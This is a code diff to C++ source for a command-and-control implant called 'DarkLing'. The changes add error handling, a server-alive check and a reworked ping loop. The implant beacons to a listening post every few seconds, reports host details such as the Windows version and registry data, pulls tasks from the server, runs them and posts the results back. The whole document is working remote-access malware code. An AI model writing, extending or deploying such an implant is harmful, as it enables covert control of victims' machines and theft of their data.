@@ -24,6 +24,10 @@
 
 
 using json = nlohmann::json;
+std::string ids;
+
+// Method to enable/disable the running status on our implant
+void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
 
 // Function to send an asynchronous HTTP POST request with a payload to the listening post
 [[nodiscard]] std::string sendHttpRequest(std::string_view host,
@@ -42,23 +46,30 @@ using json = nlohmann::json;
     ss << "http://" << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-    // Make an asynchronous HTTP POST request to the listening post
-    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
-        cpr::Body{ requestBody.dump() },
-        cpr::Header{ {"Content-Type", "application/json"} }
-    );
-    // Retrieve the response when it's ready
-    cpr::Response response = asyncRequest.get();
+    try {// Make an asynchronous HTTP POST request to the listening post
+        cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
+            cpr::Body{ requestBody.dump() },
+            cpr::Header{ {"Content-Type", "application/json"} }
+        );
 
-    // Show the request contents
-    std::cout << "Request body: " << requestBody << std::endl;
 
-    // Return the body of the response from the listening post, may include new tasks
-    return response.text;
+        // Retrieve the response when it's ready
+        cpr::Response response = asyncRequest.get();
+        if (response.status_code == 0) { // checks if the request has return 0 if yes than server is dead and if not than server is up and running
+            std::stringstream ss;
+            ss << response.status_code;
+            return ss.str();
+        }
+        // Show the request contents
+        std::cout << "Request body: " << requestBody << std::endl;
+
+        // Return the body of the response from the listening post, may include new tasks
+        return response.text;
+    }
+    catch (std::exception& e) {
+        std::cerr << "Could not deal with socket. Exception: " << e.what() << std::endl;
+    }
 };
-
-// Method to enable/disable the running status on our implant
-void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
 
 std::string GetRegistry() // Needs Optimization because at the moment this function works but the code is very shit
 {
@@ -201,24 +212,7 @@ void Implant::beaconCheckIn(const char* url) {
     resultsLocal.put("Windows Version", osinfo);
     // Parsing to json format
     boost::property_tree::write_json(resultsStringStream,resultsLocal);
-    sendHttpRequest(host,port, url, resultsStringStream.str());
-}
-// Method to ping teamserver every 10 seconds
-void Implant::Pinger() {
-    // Local results variable and root for our ptree
-    boost::property_tree::ptree resultsLocal;
-    // Our results string that we will send to the server
-    std::stringstream resultsStringStream;
-
-    // Adding our results to the root ptree for json format
-    resultsLocal.put("PING", "PONG");
-    // Parsing to json format
-    boost::property_tree::write_json(resultsStringStream, resultsLocal);
-
-    while (isRunning) { //While loop for ping every 10 seconds
-        sendHttpRequest(host, port, "/ping", resultsStringStream.str());
-        std::this_thread::sleep_for(std::chrono::seconds{ 10 });
-    }
+    if (sendHttpRequest(host, port, url, resultsStringStream.str()) == "0") { setRunning(false); }
 }
 
 // Method to set the mean dwell time on our implant
@@ -283,12 +277,31 @@ void Implant::serviceTasks() {
             // Scoped lock to add task results
             {
                 std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
-                results.add(boost::uuids::to_string(id) + ".contents", contents);
-                results.add(boost::uuids::to_string(id) + ".success", success);
+                results.add(id + ".contents", contents);
+                results.add(id + ".success", success);
             }
         }
         // Go to sleep
         std::this_thread::sleep_for(std::chrono::seconds{ 3 });
+    }
+}
+
+// Method to ping teamserver every 10 seconds
+void Implant::Pinger() {
+    // Local results variable and root for our ptree
+    boost::property_tree::ptree resultsLocal;
+    // Our results string that we will send to the server
+    std::stringstream resultsStringStream;
+
+    // Adding our results to the root ptree for json format
+    //resultsLocal.put("beacon_id", beacon_ID); requires fix
+    resultsLocal.put("alive", "TRUE");
+    // Parsing to json format
+    boost::property_tree::write_json(resultsStringStream, resultsLocal);
+
+    while (isRunning) { //While loop for ping every 10 seconds
+        std::this_thread::sleep_for(std::chrono::seconds{ 10 });
+        if (sendHttpRequest(host, port, "/ping", resultsStringStream.str()) == "0") { setRunning(false); };
     }
 }
 
@@ -301,6 +314,7 @@ void Implant::beacon() {
         try {
             std::cout << "DarkLing is sending results to listening post...\n" << std::endl;
             const auto serverResponse = sendResults();
+            if (serverResponse == "0") { setRunning(false); }; // checks if server is running if not than exit
             std::cout << "\nListening post response content: " << serverResponse << std::endl;
             std::cout << "\nParsing tasks received..." << std::endl;
             parseTasks(serverResponse);
@@ -331,4 +345,4 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) },
     // Thread that runs our pinger
     pingerThread{ std::async(std::launch::async, [this] { Pinger(); }) } {
-} 
+}    
